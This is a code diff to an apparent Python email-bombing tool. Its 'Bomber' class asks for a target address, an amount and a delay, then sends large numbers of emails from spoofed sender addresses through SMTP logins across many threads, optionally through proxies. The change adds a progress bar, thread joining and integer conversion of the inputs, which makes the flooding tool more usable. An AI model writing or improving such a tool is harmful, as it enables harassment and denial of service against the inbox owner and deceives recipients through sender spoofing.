@@ -74,14 +74,18 @@ class Bomber:
         self.cool_graphics()
         self.answers = inquirer.prompt(questions)
         self.target = self.answers["target"]
-        self.amount = self.answers["amount"]
-        self.delay = self.answers["delay"]
+        self.amount = int(self.answers["amount"])
+        self.delay = int(self.answers["delay"])
         self.debug = self.answers["debug"]
         self.error_message = "An error occurred:\n"
         self.use_proxies = self.answers["proxies"]
+        self.progress = Progress()
+        self.progress_task = self.progress.add_task("[cyan]Sending Emails...", total=self.amount)
+        self.progress_lock = threading.Lock()
+        self.threads = []
         if self.use_proxies:
             self.available_proxies = get_proxies()
-
+        
 
     def clear(self) -> None:
         os.system("cls" if os.name == "nt" else "clear")
@@ -152,7 +156,11 @@ class Bomber:
                             server.login(smtp_username, smtp_password)
                             text = msg.as_string()
                             server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
-                            Stats.sent += 1
+                            
+                            with self.progress_lock:
+                                Stats.sent += 1
+                                self.progress.update(self.progress_task, completed=Stats.sent)
+                                print("updated")
                             break
                     except Exception as e:
                         if self.debug:
@@ -167,6 +175,7 @@ class Bomber:
                         text = msg.as_string()
                         server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
                         Stats.sent += 1
+                        self.progress.update(self.progress_task, completed=Stats.sent)
                 except Exception as e:
                     if self.debug:
                         print(self.error_message, e)
@@ -178,15 +187,18 @@ class Bomber:
             pass
 
     def start(self) -> None:
-        for _ in range(int(self.amount)):
-            try:
-                threading.Thread(target=self.bomb).start()
-            except Exception as e:
-                if self.debug:
-                    print(self.error_message, e)
-                pass
+        with self.progress:
+            for _ in range(self.amount):
+                try:
+                    thread = threading.Thread(target=self.bomb)
+                    self.threads.append(thread)
+                    thread.start()
+                except Exception as e:
+                    if self.debug:
+                        print(self.error_message, e)
+                    pass
 
-            time.sleep(int(self.delay))
+                time.sleep(self.delay)
 
-#TODO: progress bar, perhaps
-#TODO: customize debug level
+        for thread in self.threads:
+            thread.join()
